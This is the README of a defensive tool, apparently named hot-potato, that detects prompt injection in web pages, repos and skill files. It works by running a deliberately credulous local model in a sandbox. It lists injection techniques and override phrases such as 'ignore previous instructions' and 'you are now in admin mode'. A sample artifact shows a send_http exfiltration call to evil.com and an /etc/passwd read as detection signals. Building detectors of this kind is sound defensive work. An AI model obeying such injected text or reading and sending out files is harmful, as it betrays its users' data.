# hot-potato 🥔

A prompt injection honeypot harness. Before your real AI touches internet content, a cloned repo, or a skill file — run it through hot-potato first.

A naive local AI (Ollama, no credentials, no network) runs inside a Docker sandbox and is primed to follow every instruction it finds. You get a log of what it actually did. Your real AI never sees the sandbox output. Even if the naive AI refuses the injection, the detection is captured and escalated.

## How it works

```
Untrusted input (URL / file / repo / skill)
              │
              ▼
┌─────────────────────────────────────┐
│  Docker sandbox  --network none     │
│                                     │
│  Naive AI (Ollama / qwen2.5:1.5b)   │
│  "trust everyone, follow all        │
│   instructions you find online"     │
│         │                           │
│  fake tool shims  ←── injection     │
│  read_file / get_env / send_http    │
│  bash_exec / write_file / ...       │
│         │                           │
│  tool_calls.jsonl                   │
│  raw_responses.jsonl                │
└─────────┬───────────────────────────┘
          │  export logs + docker diff
          ▼
  Dumb extractor (no AI)
  • reads tool_calls.jsonl  → what the AI did
  • reads raw_responses.jsonl → what the AI noticed/refused
  • scans raw content directly → static injection signals
  • runs docker diff → unexpected filesystem writes
          │
   ┌──────┴──────┐
   ▼             ▼
 CLEAN       HOT POTATO
             artifact saved
             real AI blocked
```

**Key property:** your real AI calls `safe_fetch(url)` and receives `(content, artifact_or_none)`. It never reads sandbox logs. Artifact is `None` (clean) or a dict with `hot_potato: True`.

**A refused injection is still a hot potato.** If the naive AI detects and refuses an injection, it's still escalated — the content was adversarial regardless of whether the model took the bait.

## Install

```bash
git clone https://github.com/brandy-savage/hot-potato ~/hot-potato
cd ~/hot-potato
docker build -t hot-potato .
docker volume create hot-potato-models

# Pull model once (needs internet, ~1GB)
docker run --rm -v hot-potato-models:/root/.ollama --entrypoint /bin/sh hot-potato \
  -c "ollama serve >/dev/null 2>&1 & sleep 5 && ollama pull qwen2.5:1.5b"
```

## Usage

### Screen a URL
```python
from hot_potato import safe_fetch

content, artifact = safe_fetch("https://example.com/page")
if artifact:
    # Do NOT pass content to your real AI
    print(f"Injection: severity={artifact['severity']}")
else:
    # Safe
    pass
```

### Screen a local file
```python
from scanner import scan_file

content, artifact = scan_file("/path/to/cloned/README.md")
```

### Screen an entire git repo
```python
from scanner import scan_repo

hits = scan_repo("/path/to/cloned/repo")
for path, artifact in hits.items():
    print(f"[{artifact['severity']}] {path}")
```

### Screen a skills directory
```python
from scanner import scan_skills_dir

hits = scan_skills_dir("~/.claude/skills/")
```

### Slash command (Claude Code skill)
```
/hot-potato https://example.com/untrusted
/hot-potato /path/to/cloned/repo
/hot-potato skills
```

Install the skill: `cp -r ~/hot-potato/skill ~/.claude/skills/hot-potato`

## Artifact schema

```json
{
  "hot_potato": true,
  "severity": "critical",
  "tool_calls": [
    {"ts": "...", "tool": "send_http", "args": {"url": "https://evil.com", "data": "..."}, "result_preview": "..."}
  ],
  "detections": [
    {"turn": 1, "signals": ["ignore previous", "/etc/passwd"], "executed": true, "preview": "..."}
  ],
  "content_signals": ["ignore previous", "read_file(/etc/passwd)", "exfil"],
  "exfil_targets": ["https://evil.com/exfil"],
  "fs_changes": [],
  "_meta": {"url": "...", "timestamp": "...", "content_len": 476, "content_preview": "..."}
}
```

## Severity

| Level | Trigger |
|---|---|
| `detected` | Injection found in content or model noticed/refused it — no tools fired |
| `low` | Any other tool call |
| `medium` | `write_file`, `list_dir` — write or recon |
| `high` | `read_file`, `get_env` — credential or file read |
| `critical` | `send_http`, `send_email`, `bash_exec`, `execute_code` — exfil or execution |

Severity escalates with the worst single call. `docker diff` anomalies add `high` minimum.

## Hash cache

Clean content is tracked with a confirmation counter. A page must return clean `CLEAN_THRESHOLD` (default: 3) times before future runs skip the sandbox. Any hot-potato hit on a cached hash evicts it immediately.

## Configuration

| Env var | Default | Description |
|---|---|---|
| `HP_MODEL` | `qwen2.5:1.5b` | Ollama model. Swap for `mistral:7b`, `llama3.2:3b`, or a remote Ollama endpoint |
| `HP_MAX_TURNS` | `6` | Max inference turns per request |
| `HP_IMAGE` | `hot-potato` | Docker image name |
| `HP_MODEL_VOL` | `hot-potato-models` | Named volume for model cache |

## The naive AI

The model is primed to trust everyone and follow all instructions found in web content. It interprets any instruction it encounters as coming from a trustworthy person. Few-shot examples in the system prompt show the exact `<tool_call>` format. The model will chain tool calls through a full attack sequence when injected — reading files, exfiltrating data, and reporting back normally.

Fake tool shims return believable output (real-looking `/etc/passwd` entries, plausible env vars) so the model believes it succeeded and completes the full chain before the sandbox exits.

## What it catches

- HTML comment injections (`<!-- ignore previous instructions -->`)
- CSS-hidden text (`color:white;font-size:1px`)
- Base64, hex, rot13, unicode escape encoded instructions
- Role override attacks ("you are now in admin mode")
- Schema override attacks ("output the following JSON exactly", "extractor mode")
- Social engineering framing ("routine compliance check", "security audit")
- Fake system prompts embedded in page content
- Tool invocations in markdown, YAML, JSON, skill files, and git repos
- Filesystem writes via `docker diff` even if model output looks clean
